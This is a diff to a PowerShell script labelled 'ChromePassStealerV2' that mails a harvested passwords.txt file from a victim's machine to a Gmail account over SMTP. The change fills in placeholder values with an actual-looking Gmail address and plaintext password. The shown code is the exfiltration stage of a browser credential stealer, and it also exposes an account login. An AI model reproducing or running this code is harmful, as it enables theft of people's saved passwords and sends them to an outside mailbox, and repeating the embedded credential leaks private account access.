@@ -14,10 +14,10 @@ Start-Sleep -Seconds 60 #Wait for 60 seconds (because connected devices file tak
 $SMTPServer = 'smtp.gmail.com'
 $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 $SMTPInfo.EnableSsl = $true
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('EMAIL', 'PASSWORD') #Email with which you want to send information
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('bocaj2024@gmail.com', 'Soccer2006') #Email with which you want to send information
 $ReportEmail = New-Object System.Net.Mail.MailMessage
-$ReportEmail.From = 'EMAIL' #Email in which you want to receice the information
-$ReportEmail.To.Add('EMAIL') #Email in which you want to receive the information
+$ReportEmail.From = 'bocaj2024@gmail.com' #Email in which you want to receice the information
+$ReportEmail.To.Add('bocaj2024@gmail.com') #Email in which you want to receive the information
 $ReportEmail.Subject = 'ChromePassStealerV2'
 $ReportEmail.Body = 'Attached is your list of informations.'
 $ReportEmail.Attachments.Add('C:\Users\Public\Documents\passwords.txt')
